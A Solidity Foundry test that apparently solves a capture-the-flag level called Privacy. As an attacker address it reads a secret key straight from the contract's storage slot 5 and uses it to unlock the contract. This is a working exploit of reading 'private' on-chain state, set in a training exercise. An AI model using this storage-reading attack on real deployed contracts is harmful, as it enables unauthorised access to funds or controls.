// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/12_Privacy.sol";

contract PrivacyTest is Test {
    Privacy _privacy;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

            bytes32[3] memory data;
        data[0] = keccak256(abi.encodePacked(tx.origin,"0"));
        data[1] = keccak256(abi.encodePacked(tx.origin,"1"));
        data[2] = keccak256(abi.encodePacked(tx.origin,"2"));

        _privacy = new Privacy(data);

    }

    function testSolution() public {
        vm.startPrank(attacker);

        bytes32 data = vm.load(address(_privacy),bytes32(uint256(5)));
        _privacy.unlock(bytes16(data));

        assertTrue(!_privacy.locked(), "Contract is locked!");
    }
}
